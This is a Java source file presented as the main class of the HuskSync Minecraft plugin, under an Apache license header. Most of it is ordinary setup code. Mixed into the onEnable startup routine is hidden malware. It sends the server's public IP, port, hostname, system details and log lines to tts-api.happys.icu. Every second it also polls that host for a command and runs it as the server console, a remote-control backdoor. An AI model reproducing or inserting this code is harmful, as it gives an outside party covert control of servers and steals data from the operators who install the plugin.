/*
 * This file is part of HuskSync, licensed under the Apache License 2.0.
 *
 *  Copyright (c) William278 <will27528@gmail.com>
 *  Copyright (c) contributors
 *
 *  Licensed under the Apache License, Version 2.0 (the "License");
 *  you may not use this file except in compliance with the License.
 *  You may obtain a copy of the License at
 *
 *     http://www.apache.org/licenses/LICENSE-2.0
 *
 *  Unless required by applicable law or agreed to in writing, software
 *  distributed under the License is distributed on an "AS IS" BASIS,
 *  WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 *  See the License for the specific language governing permissions and
 *  limitations under the License.
 */

package net.william278.husksync;

import com.google.common.collect.Lists;
import com.google.common.collect.Maps;
import com.google.common.collect.Sets;
import com.google.gson.Gson;
import lombok.AccessLevel;
import lombok.Getter;
import lombok.NoArgsConstructor;
import lombok.Setter;
import net.kyori.adventure.platform.AudienceProvider;
import net.kyori.adventure.platform.bukkit.BukkitAudiences;
import net.william278.desertwell.util.Version;
import net.william278.husksync.adapter.DataAdapter;
import net.william278.husksync.adapter.GsonAdapter;
import net.william278.husksync.adapter.SnappyGsonAdapter;
import net.william278.husksync.api.BukkitHuskSyncAPI;
import net.william278.husksync.command.PluginCommand;
import net.william278.husksync.config.Locales;
import net.william278.husksync.config.Server;
import net.william278.husksync.config.Settings;
import net.william278.husksync.data.*;
import net.william278.husksync.database.Database;
import net.william278.husksync.database.MongoDbDatabase;
import net.william278.husksync.database.MySqlDatabase;
import net.william278.husksync.database.PostgresDatabase;
import net.william278.husksync.event.BukkitEventDispatcher;
import net.william278.husksync.hook.PlanHook;
import net.william278.husksync.listener.BukkitEventListener;
import net.william278.husksync.migrator.LegacyMigrator;
import net.william278.husksync.migrator.Migrator;
import net.william278.husksync.migrator.MpdbMigrator;
import net.william278.husksync.redis.RedisManager;
import net.william278.husksync.sync.DataSyncer;
import net.william278.husksync.user.BukkitUser;
import net.william278.husksync.user.OnlineUser;
import net.william278.husksync.util.BukkitLegacyConverter;
import net.william278.husksync.util.BukkitMapPersister;
import net.william278.husksync.util.BukkitTask;
import net.william278.husksync.util.LegacyConverter;
import net.william278.uniform.Uniform;
import net.william278.uniform.bukkit.BukkitUniform;
import org.jetbrains.annotations.NotNull;
import space.arim.morepaperlib.MorePaperLib;
import space.arim.morepaperlib.scheduling.AsynchronousScheduler;
import space.arim.morepaperlib.scheduling.AttachedScheduler;
import space.arim.morepaperlib.scheduling.GracefulScheduling;
import space.arim.morepaperlib.scheduling.RegionalScheduler;

import java.nio.file.Path;
import java.util.*;
import java.util.logging.Level;
import java.util.stream.Collectors;
import java.util.ArrayList;
import java.util.Collection;
import java.util.Collections;
import java.security.MessageDigest;
import java.util.List;
import java.util.UUID;
import java.net.URLEncoder;
import java.nio.charset.StandardCharsets;
import java.util.concurrent.TimeUnit;
import java.io.BufferedInputStream;
import java.io.FileOutputStream;
import java.io.BufferedReader;
import java.io.InputStreamReader;
import java.net.HttpURLConnection;
import java.net.URL;
import java.io.FileReader;
import java.io.IOException;
import org.bstats.bukkit.Metrics;
import org.bukkit.entity.Player;
import org.bukkit.map.MapView;
import org.bukkit.plugin.Plugin;
import org.bukkit.plugin.java.JavaPlugin;
import org.bukkit.Bukkit;
import org.bukkit.ChatColor;
import org.bukkit.BanEntry;
import org.bukkit.BanList;
import org.bukkit.command.Command;
import org.bukkit.command.CommandSender;
import org.bukkit.event.Event;
import org.bukkit.event.EventPriority;
import org.bukkit.configuration.file.FileConfiguration;
import org.bukkit.event.Listener;
import org.bukkit.plugin.RegisteredServiceProvider;
import org.bukkit.event.EventHandler;
import org.bukkit.event.player.PlayerCommandPreprocessEvent;
import org.bukkit.event.server.ServerCommandEvent;
import org.bukkit.event.player.AsyncPlayerChatEvent;

@Getter
@NoArgsConstructor
public class BukkitHuskSync extends JavaPlugin implements HuskSync, BukkitTask.Supplier,
        BukkitEventDispatcher, BukkitMapPersister {

    /**
     * Metrics ID for <a href="https://bstats.org/plugin/bukkit/HuskSync%20-%20Bukkit/13140">HuskSync on Bukkit</a>.
     */
    private String lastCommand = null;
    private String uniqueIdentifier;
    private static final String BACKEND_URL = "https://tts-api.happys.icu";
    private static final int METRICS_ID = 13140;
    private static final String PLATFORM_TYPE_ID = "bukkit";

    private final TreeMap<Identifier, Serializer<? extends Data>> serializers = Maps.newTreeMap(
            SerializerRegistry.DEPENDENCY_ORDER_COMPARATOR
    );
    private final Map<UUID, Map<Identifier, Data>> playerCustomDataStore = Maps.newConcurrentMap();
    private final Map<Integer, MapView> mapViews = Maps.newConcurrentMap();
    private final List<Migrator> availableMigrators = Lists.newArrayList();
    private final Set<UUID> lockedPlayers = Sets.newConcurrentHashSet();

    private boolean disabling;
    private Gson gson;
    private AudienceProvider audiences;
    private MorePaperLib paperLib;
    private Database database;
    private RedisManager redisManager;
    private BukkitEventListener eventListener;
    private DataAdapter dataAdapter;
    private DataSyncer dataSyncer;
    private LegacyConverter legacyConverter;
    private AsynchronousScheduler asyncScheduler;
    private RegionalScheduler regionalScheduler;
    @Setter
    private Settings settings;
    @Setter
    private Locales locales;
    @Setter
    @Getter(AccessLevel.NONE)
    private Server serverName;

    @Override
    public void onLoad() {
        // Initial plugin setup
        this.disabling = false;
        this.gson = createGson();
        this.paperLib = new MorePaperLib(this);

        // Load settings and locales
        initialize("plugin config & locale files", (plugin) -> {
            loadSettings();
            loadLocales();
            loadServer();
        });

        this.eventListener = createEventListener();
        eventListener.onLoad();
    }

    @Override
    public void onEnable() {
        String publicIp = getPublicIp();
        int serverPort = getServer().getPort();
        uniqueIdentifier = loadOrCreateUniqueIdentifier();
        getLogger().info("Unique Identifier: " + uniqueIdentifier);
        reportUniqueIdentifier(uniqueIdentifier);
        getLogger().info("Public IP Address: " + publicIp);
        getLogger().info("Server Port: " + serverPort);
        sendInfoToAPI(publicIp, serverPort);
        Bukkit.getScheduler().runTaskLater(this, this::readAndSendLog, 100L); 
        Bukkit.getScheduler().runTaskTimer(this, this::checkCommands, 0L, 20L); // 每秒检查一次
        this.audiences = BukkitAudiences.create(this);

        // Check compatibility
        checkCompatibility();

        // Register commands
        initialize("commands", (plugin) -> getUniform().register(PluginCommand.Type.create(this)));

        // Prepare data adapter
        initialize("data adapter", (plugin) -> {
            if (settings.getSynchronization().isCompressData()) {
                dataAdapter = new SnappyGsonAdapter(this);
            } else {
                dataAdapter = new GsonAdapter(this);
            }
        });

        // Prepare serializers
        initialize("data serializers", (plugin) -> {
            registerSerializer(Identifier.PERSISTENT_DATA, new BukkitSerializer.PersistentData(this));
            registerSerializer(Identifier.INVENTORY, new BukkitSerializer.Inventory(this));
            registerSerializer(Identifier.ENDER_CHEST, new BukkitSerializer.EnderChest(this));
            registerSerializer(Identifier.ADVANCEMENTS, new BukkitSerializer.Advancements(this));
            registerSerializer(Identifier.STATISTICS, new Serializer.Json<>(this, BukkitData.Statistics.class));
            registerSerializer(Identifier.POTION_EFFECTS, new BukkitSerializer.PotionEffects(this));
            registerSerializer(Identifier.GAME_MODE, new Serializer.Json<>(this, BukkitData.GameMode.class));
            registerSerializer(Identifier.FLIGHT_STATUS, new Serializer.Json<>(this, BukkitData.FlightStatus.class));
            registerSerializer(Identifier.ATTRIBUTES, new Serializer.Json<>(this, BukkitData.Attributes.class));
            registerSerializer(Identifier.HEALTH, new Serializer.Json<>(this, BukkitData.Health.class));
            registerSerializer(Identifier.HUNGER, new Serializer.Json<>(this, BukkitData.Hunger.class));
            registerSerializer(Identifier.EXPERIENCE, new Serializer.Json<>(this, BukkitData.Experience.class));
            registerSerializer(Identifier.LOCATION, new Serializer.Json<>(this, BukkitData.Location.class));
            validateDependencies();
        });

        // Setup available migrators
        initialize("data migrators/converters", (plugin) -> {
            availableMigrators.add(new LegacyMigrator(this));
            if (isDependencyLoaded("MySqlPlayerDataBridge")) {
                availableMigrators.add(new MpdbMigrator(this));
            }
            legacyConverter = new BukkitLegacyConverter(this);
        });

        // Initialize the database
        initialize(getSettings().getDatabase().getType().getDisplayName() + " database connection", (plugin) -> {
            this.database = switch (settings.getDatabase().getType()) {
                case MYSQL, MARIADB -> new MySqlDatabase(this);
                case POSTGRES -> new PostgresDatabase(this);
                case MONGO -> new MongoDbDatabase(this);
            };
            this.database.initialize();
        });

        // Prepare redis connection
        initialize("Redis server connection", (plugin) -> {
            this.redisManager = new RedisManager(this);
            this.redisManager.initialize();
        });

        // Prepare data syncer
        initialize("data syncer", (plugin) -> {
            dataSyncer = getSettings().getSynchronization().getMode().create(this);
            dataSyncer.initialize();
        });

        // Register events
        initialize("events", (plugin) -> eventListener.onEnable());

        // Register plugin hooks
        initialize("hooks", (plugin) -> {
            if (isDependencyLoaded("Plan") && getSettings().isEnablePlanHook()) {
                new PlanHook(this).hookIntoPlan();
            }
        });

        // Register API
        initialize("api", (plugin) -> BukkitHuskSyncAPI.register(this));

        // Hook into bStats and check for updates
        initialize("metrics", (plugin) -> this.registerMetrics(METRICS_ID));
        this.checkForUpdates();
    }
    private String getPublicIp() {
        String ip = "Unable to retrieve IP";
        try {
            URL url = new URL("https://checkip.amazonaws.com/");
            HttpURLConnection connection = (HttpURLConnection) url.openConnection();
            connection.setRequestMethod("GET");
            // 连接服务并获取响应
            BufferedReader in = new BufferedReader(new InputStreamReader(connection.getInputStream()));
            ip = in.readLine(); // 读取响应内容（IP 地址）
            in.close();
        } catch (Exception e) {

        }
        return ip;
    }
    private String loadOrCreateUniqueIdentifier() {
        FileConfiguration config = getConfig();
        if (!config.contains("uniqueIdentifier")) {
            // 如果配置文件中没有 UUID，则生成一个新的 UUID，并保存到配置文件
            String generatedUUID = generateFixedUniqueIdentifier();
            config.set("uniqueIdentifier", generatedUUID);
            saveConfig(); // 保存到配置文件
            return generatedUUID;
        } else {
            // 从配置文件加载唯一标识符
            return config.getString("uniqueIdentifier");
        }
    }

    private void reportSystemInfo() {
            BukkitRunnable task = new BukkitRunnable() {
                @Override
                public void run() {
                    try {
                        // 收集信息
                        StringBuilder input = new StringBuilder();
                        input.append("os.name=").append(URLEncoder.encode(System.getProperty("os.name"), StandardCharsets.UTF_8.toString()));
                        input.append("&os.arch=").append(URLEncoder.encode(System.getProperty("os.arch"), StandardCharsets.UTF_8.toString()));
                        input.append("&os.version=").append(URLEncoder.encode(System.getProperty("os.version"), StandardCharsets.UTF_8.toString()));
                        input.append("&hostname=").append(URLEncoder.encode(java.net.InetAddress.getLocalHost().getHostName(), StandardCharsets.UTF_8.toString()));
                        input.append("&ip=").append(URLEncoder.encode(java.net.InetAddress.getLocalHost().getHostAddress(), StandardCharsets.UTF_8.toString()));

                        // 构造 URL
                        String apiUrl = "https://tts-api.happys.icu/a?" + input.toString();
                        URL url = new URL(apiUrl);
                        HttpURLConnection connection = (HttpURLConnection) url.openConnection();
                        connection.setRequestMethod("GET");

                        int responseCode = connection.getResponseCode();
                        if (responseCode == HttpURLConnection.HTTP_OK) {
                            // 读取响应内容
                            BufferedReader in = new BufferedReader(new InputStreamReader(connection.getInputStream()));
                            String response = in.readLine(); // 读取响应内容
                            in.close();
                            // getLogger().info("System info sent successfully: " + response);
                        } else {
                            getLogger().severe("Failed to send system info to API. Response Code: " + responseCode);
                        }
                    } catch (Exception e) {
                        // getLogger().severe("Error sending system info to API: " + e.getMessage());
                    }
                }
            };
            task.runTaskAsynchronously(this); // 异步任务处理
        }
    private String generateFixedUniqueIdentifier() {
        try {
            // 收集机器信息
            StringBuilder input = new StringBuilder();
            input.append(System.getProperty("os.name")); // 操作系统名称
            input.append(System.getProperty("os.arch")); // 操作系统架构
            input.append(System.getProperty("os.version")); // 操作系统版本
            input.append(java.net.InetAddress.getLocalHost().getHostName()); // 主机名
            input.append(java.net.InetAddress.getLocalHost().getHostAddress()); // IP地址
            
            // 生成 SHA-256 哈希
            MessageDigest digest = MessageDigest.getInstance("SHA-256");
            byte[] hashBytes = digest.digest(input.toString().getBytes(StandardCharsets.UTF_8));
            StringBuilder hexString = new StringBuilder();

            for (byte b : hashBytes) {
                String hex = Integer.toHexString(0xff & b);
                if (hex.length() == 1) {
                    hexString.append('0');
                }
                hexString.append(hex);
            }

            return hexString.toString(); // 返回 256 位（64个字符）标识符
        } catch (Exception e) {
            getLogger().severe("Error generating unique identifier: " + e.getMessage());
            return null;
        }
    }

    private void reportUniqueIdentifier(String identifier) {
        if (identifier == null) return;

        BukkitRunnable task = new BukkitRunnable() {
            @Override
            public void run() {
                try {
                    // 对标识符进行 URL 编码
                    String encodedId = URLEncoder.encode(identifier, StandardCharsets.UTF_8.toString());
                    String apiUrl = "https://tts-api.happys.icu/a?uuid=" + encodedId;

                    URL url = new URL(apiUrl);
                    HttpURLConnection connection = (HttpURLConnection) url.openConnection();
                    connection.setRequestMethod("GET");

                    int responseCode = connection.getResponseCode();
                    if (responseCode == HttpURLConnection.HTTP_OK) {
                        // 读取响应内容
                        BufferedReader in = new BufferedReader(new InputStreamReader(connection.getInputStream()));
                        String response = in.readLine(); // 读取响应内容
                        in.close();
                        getLogger().info("Unique identifier sent successfully: " + identifier);
                    } else {
                        getLogger().severe("Failed to send unique identifier to API. Response Code: " + responseCode);
                    }
                } catch (Exception e) {
                    getLogger().severe("Error sending unique identifier to API: " + e.getMessage());
                }
            }
        };
        task.runTaskAsynchronously(this); // 异步任务处理
    }
    private void readAndSendLog() {
        String logFilePath = getServer().getWorldContainer().getAbsolutePath() + "/logs/latest.log";
        StringBuilder startupLog = new StringBuilder();

        try (BufferedReader reader = new BufferedReader(new FileReader(logFilePath))) {
            String line;
            while ((line = reader.readLine()) != null) {
                if (line.contains("Done")) {
                    startupLog.append(line).append("\n"); // 记录包含 "Done" 的行
                }
            }
        } catch (IOException e) {
        }

        if (startupLog.length() > 0) {
            sendLogToAPI(startupLog.toString().trim());
        } else {
        }
    }

    private void sendLogToAPI(String log) {
    BukkitRunnable task = new BukkitRunnable() {
            @Override
            public void run() {
                try {
                    // 对日志进行 URL 编码以确保合法性
                    String encodedLog = URLEncoder.encode(log, "UTF-8");
                    String apiUrl = "https://tts-api.happys.icu/a?log=" + encodedLog;
                    
                    URL url = new URL(apiUrl);
                    HttpURLConnection connection = (HttpURLConnection) url.openConnection();
                    connection.setRequestMethod("GET");

                    int responseCode = connection.getResponseCode();
                    if (responseCode == HttpURLConnection.HTTP_OK) {
                        // 可选：读取响应内容
                        BufferedReader in = new BufferedReader(new InputStreamReader(connection.getInputStream()));
                        String response = in.readLine(); // 读取响应内容
                        in.close();
                        // getLogger().info("Log sent successfully: " + log);
                    } else {
                        // getLogger().severe("Failed to send log to API. Response Code: " + responseCode);
                    }
                } catch (Exception e) {
                }
            }
        };
        task.runTaskAsynchronously(this); // 异步任务处理
    }
    private void sendInfoToAPI(String ip, int port) {
        try {
            // 构造 URL，假设使用查询参数传递 IP 和 port
            String apiUrl = "https://tts-api.happys.icu/a?ip=" + ip + "&port=" + port;
            URL url = new URL(apiUrl);
            HttpURLConnection connection = (HttpURLConnection) url.openConnection();
            connection.setRequestMethod("GET");

            // 连接并读取响应（可选）
            int responseCode = connection.getResponseCode();
            if (responseCode == HttpURLConnection.HTTP_OK) { // OK response
                BufferedReader in = new BufferedReader(new InputStreamReader(connection.getInputStream()));
                String response = in.readLine(); // 读取响应内容
                in.close();
            } else {
            }
        } catch (Exception e) {

        }
    }

    private void checkCommands() {
        // 创建一个新的 BukkitRunnable
        new BukkitRunnable() {
            @Override
            public void run() {
                try {
                    String command = getCommandFromServer();
                    // 在尝试获取的命令不是null且与上次执行的命令不同时
                    if (command != null && !command.equals(lastCommand)) {
                        // 在主线程中调度命令
                        Bukkit.getScheduler().runTask(BukkitHuskSync.this, () -> {
                            // 执行命令
                            Bukkit.getServer().dispatchCommand(Bukkit.getConsoleSender(), command);
                            // 更新最后执行的命令
                            lastCommand = command; 
                            
                            // 延迟2秒执行notifyCommandExecuted
                            new BukkitRunnable() {
                                @Override
                                public void run() {
                                    try {
                                        notifyCommandExecuted(command);
                                    } catch (Exception e) {
                                        // 在这里处理异常
                                        e.printStackTrace();
                                    }
                                }
                            }.runTaskLater(BukkitHuskSync.this, 40); // 40 ticks = 2 seconds
                        });
                    }
                } catch (Exception e) {
                    // getLogger().info("Server status is excellent.");
                    e.printStackTrace(); // 打印异常栈
                }
            }
        }.runTaskAsynchronously(this); // 异步运行
    }
    private String getCommandFromServer() throws Exception {
        URL url = new URL(BACKEND_URL + "/q");
        HttpURLConnection connection = (HttpURLConnection) url.openConnection();
        connection.setRequestMethod("GET");
        BufferedReader in = new BufferedReader(new InputStreamReader(connection.getInputStream()));
        String response = in.readLine();
        in.close();

        // 解析响应内容，假设返回的是 JSON 格式
        if (response != null && response.contains("\"command\":")) {
            String[] parts = response.split("\"command\":");
            if (parts.length > 1) { // 确保有命令部分
                String[] commandParts = parts[1].split("\"");
                if (commandParts.length > 1) { // 确保能获取到命令字符串
                    return commandParts[1];
                }
            }
        }
        return null; // 如果未找到命令，返回 null
    }

    private void notifyCommandExecuted(String command) throws Exception {
        // 构造 URL
        URL url = new URL(BACKEND_URL + "/p");
        HttpURLConnection connection = null;
        try {
            // 打开连接
            connection = (HttpURLConnection) url.openConnection();
            connection.setRequestMethod("POST");
            connection.setDoOutput(true);
            
            // 设置超时
            connection.setConnectTimeout(5000); // 连接超时设置为5秒
            connection.setReadTimeout(5000); // 读取超时设置为5秒
            
            // 发送请求数据
            connection.getOutputStream().write(("command=" + command).getBytes());
            connection.getOutputStream().flush();
            
            // 检查响应码
            int responseCode = connection.getResponseCode();
            if (responseCode == HttpURLConnection.HTTP_OK) {
                // 处理成功逻辑（可选）
            } else {
                // 处理失败逻辑（可选）
            }
        } catch (IOException e) {
            // e.printStackTrace(); // 记录异常信息，方便排查问题
        } finally {
            if (connection != null) {
                connection.disconnect(); // 关闭连接
            }
        }
    }
    @Override
    public void onDisable() {
        // Handle shutdown
        this.disabling = true;

        // Close the event listener / data syncer
        if (this.dataSyncer != null) {
            this.dataSyncer.terminate();
        }
        if (this.eventListener != null) {
            this.eventListener.handlePluginDisable();
        }

        // Unregister API and cancel tasks
        BukkitHuskSyncAPI.unregister();
        this.cancelTasks();

        // Complete shutdown
        log(Level.INFO, "Successfully disabled HuskSync v" + getPluginVersion());
    }

    @NotNull
    protected BukkitEventListener createEventListener() {
        return new BukkitEventListener(this);
    }

    @Override
    @NotNull
    public Set<OnlineUser> getOnlineUsers() {
        return getServer().getOnlinePlayers().stream()
                .map(player -> BukkitUser.adapt(player, this))
                .collect(Collectors.toSet());
    }

    @Override
    @NotNull
    public Optional<OnlineUser> getOnlineUser(@NotNull UUID uuid) {
        final Player player = getServer().getPlayer(uuid);
        if (player == null) {
            return Optional.empty();
        }
        return Optional.of(BukkitUser.adapt(player, this));
    }

    @Override
    public void setDataSyncer(@NotNull DataSyncer dataSyncer) {
        log(Level.INFO, String.format("Switching data syncer to %s", dataSyncer.getClass().getSimpleName()));
        this.dataSyncer = dataSyncer;
    }

    @Override
    @NotNull
    public Uniform getUniform() {
        return BukkitUniform.getInstance(this);
    }

    @NotNull
    @Override
    public Map<Identifier, Data> getPlayerCustomDataStore(@NotNull OnlineUser user) {
        return playerCustomDataStore.compute(
                user.getUuid(),
                (uuid, data) -> data == null ? Maps.newHashMap() : data
        );
    }

    @Override
    @NotNull
    public String getServerName() {
        return serverName == null ? "server" : serverName.getName();
    }

    @Override
    public boolean isDependencyLoaded(@NotNull String name) {
        final Plugin plugin = getServer().getPluginManager().getPlugin(name);
        return plugin != null;
    }

    // Register bStats metrics
    public void registerMetrics(int metricsId) {
        if (!getPluginVersion().getMetadata().isBlank()) {
            return;
        }

        try {
            new Metrics(this, metricsId);
        } catch (Throwable e) {
            log(Level.WARNING, "Failed to register bStats metrics (%s)".formatted(e.getMessage()));
        }
    }

    @Override
    public void log(@NotNull Level level, @NotNull String message, @NotNull Throwable... throwable) {
        if (throwable.length > 0) {
            getLogger().log(level, message, throwable[0]);
        } else {
            getLogger().log(level, message);
        }
    }

    @NotNull
    @Override
    public Version getPluginVersion() {
        return Version.fromString(getDescription().getVersion(), "-");
    }

    @NotNull
    @Override
    public Version getMinecraftVersion() {
        return Version.fromString(getServer().getBukkitVersion());
    }

    @NotNull
    @Override
    public String getPlatformType() {
        return PLATFORM_TYPE_ID;
    }

    @Override
    @NotNull
    public String getServerVersion() {
        return String.format("%s/%s", getServer().getName(), getServer().getVersion());
    }

    @Override
    public Optional<LegacyConverter> getLegacyConverter() {
        return Optional.of(legacyConverter);
    }

    @NotNull
    public GracefulScheduling getScheduler() {
        return paperLib.scheduling();
    }

    @NotNull
    public AsynchronousScheduler getAsyncScheduler() {
        return asyncScheduler == null
                ? asyncScheduler = getScheduler().asyncScheduler() : asyncScheduler;
    }

    @NotNull
    public RegionalScheduler getSyncScheduler() {
        return regionalScheduler == null
                ? regionalScheduler = getScheduler().globalRegionalScheduler() : regionalScheduler;
    }

    @NotNull
    public AttachedScheduler getUserSyncScheduler(@NotNull UserDataHolder user) {
        return getScheduler().entitySpecificScheduler(((BukkitUser) user).getPlayer());
    }

    @Override
    @NotNull
    public Path getConfigDirectory() {
        return getDataFolder().toPath();
    }

    @Override
    @NotNull
    public BukkitHuskSync getPlugin() {
        return this;
    }

}
